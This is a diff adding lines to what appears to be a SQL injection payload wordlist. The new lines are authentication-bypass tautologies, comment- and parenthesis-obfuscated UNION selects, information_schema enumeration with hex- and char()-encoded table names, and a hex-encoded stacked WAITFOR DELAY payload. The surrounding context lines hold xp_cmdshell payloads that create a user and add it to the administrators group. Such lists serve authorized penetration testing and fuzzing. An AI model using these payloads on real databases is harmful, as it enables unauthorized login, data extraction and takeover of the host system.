@@ -114,3 +114,16 @@ admin--
 `;exec master..xp_cmdshell "echo you-are-hacked> c:\hacked.txt:ads.txt; --
 `;exec master..xp_cmdshell "net localgroup administrators badguy /ADD"; --
 `;exec master..xp_cmdshell "net user badguy /ADD"; --
+'' or 1=1--
+' or 1=1-- 
+\'' or 1=1--
+\' or 1=1-- 
+(0)union(select(0),database(),(0))#
+0/**/union/**/select/**/0,database(),0#
+1 and 1=0 union select null,group_concat(column_name),null from information_schema.columns where table_name=0x7573657273#
+1 and 1=0 union select null,group_concat(column_name),null from information_schema.columns where table_name=concat(char(117),char(115),char(101),char(114),char(115))#
+1;declare @s varchar(4000);set @s=cast(0x77616974666f722064656c6179202730303a30303a3330273b as varchar(4000));exec @s;--
+' or 1=(case when (select user())='sa' then 1 else 2 end) or 'a'='b
+' union ALL select…
+' or 777=777--
+' or 'a' like 'a'--
